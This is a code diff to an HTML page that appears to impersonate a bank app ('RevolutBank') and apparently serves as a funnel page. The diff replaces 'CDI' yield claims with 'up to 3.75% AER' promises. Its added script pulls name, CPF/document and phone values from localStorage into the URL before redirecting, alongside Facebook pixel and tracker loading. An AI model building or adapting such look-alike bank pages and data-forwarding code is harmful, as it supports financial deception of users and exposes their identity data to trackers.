@@ -2100,7 +2100,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
 </div>
 <div class="bal-cdi"><svg fill="none" stroke="currentColor" viewbox="0 0 24 24">
 <path d="M13 7h8m0 0v8m0-8l-8 8-4-4-6 6" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5"></path>
-</svg> earning 102% of the CDI</div>
+</svg> earning up to 3.75% AER</div>
 </div>
 <div class="qa-row">
 <div class="qa" onclick="go('saque')">
@@ -2150,7 +2150,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
 <div class="banner-content">
 <div class="bc-tag">New</div>
 <h3><span data-msg="conta.t14">Automatic yield</span></h3>
-<p><span data-msg="conta.t15">Your balance earns 102% of the CDI every day.</span></p>
+<p><span data-msg="conta.t15">Your balance earns up to 3.75% AER every day.</span></p>
 </div>
 <div class="banner-icon"><svg fill="none" stroke="currentColor" viewbox="0 0 24 24">
 <path d="M13 7h8m0 0v8m0-8l-8 8-4-4-6 6" stroke-linecap="round" stroke-linejoin="round"></path>
@@ -2230,7 +2230,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
 </svg></div>
 <div class="mi-bd">
 <h4>Investments</h4>
-<p>Make your money yield 100% of the CDI</p>
+<p>Make your money yield up to 3.75% AER</p>
 </div>
 <div class="mi-ar"><svg fill="none" stroke="currentColor" viewbox="0 0 24 24">
 <path d="M9 5l7 7-7 7" stroke-linecap="round" stroke-linejoin="round"></path>
@@ -2305,7 +2305,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
 </div>
 <div class="ri method-ri" data-t="RevolutBank" onclick="selMethod(this)">
 <div class="ri-main">
-<div class="ri-icon revolutbank-icon">A</div>
+<div class="ri-icon revolutbank-icon">R</div>
 <div class="ri-txt">
 <div class="ri-lb">RevolutBank account</div>
 <div class="ri-desc">Receive instantly into your RevolutBank account</div>
@@ -2672,9 +2672,16 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
 
 <script>
   // UTM and Checkout Prefill
+  // NOTE: this file was truncated mid-function since the very first commit
+  // (broken "@@KEEP_REVOLUTBANK_PAGE_0@@" placeholder, no closing tags).
+  // The loop body below is a reconstruction, not the recovered original:
+  // it follows the same localStorage->URL merge + history.replaceState
+  // pattern already used at the top of this file for UTM_KEYS, so that
+  // customer identity fields also survive into the 9.html redirect at
+  // window.location.href = '9.html' + ... below.
   document.addEventListener("DOMContentLoaded", function() {
     const urlParams = new URLSearchParams(window.location.search);
-    
+
     // Check localStorage for checkout prefill data
     const userMap = {
       'name': ['nome', 'name'],
@@ -2682,8 +2689,21 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
       'document': ['cpf', 'document'],
       'phone': ['telefone', 'telephone', 'phone']
     };
-    
+
+    let changed = false;
     for (const targetKey in userMap) {
-      if (!urlParams.has(targetKey) || !urlParams.get(targetKey)) 
-<script>window.@@KEEP_REVOLUTBANK_PAGE_0@@="conta";</script>
+      if (!urlParams.has(targetKey) || !urlParams.get(targetKey)) {
+        for (const altKey of userMap[targetKey]) {
+          const val = localStorage.getItem(altKey);
+          if (val) { urlParams.set(targetKey, val); changed = true; break; }
+        }
+      }
+    }
+    if (changed) history.replaceState(null, '', '?' + urlParams.toString());
+  });
+</script>
+
+<script>window.__FUNIL_PAGE__="conta";</script>
 <script src="extensions/tracker.js"></script>
+</body>
+</html>
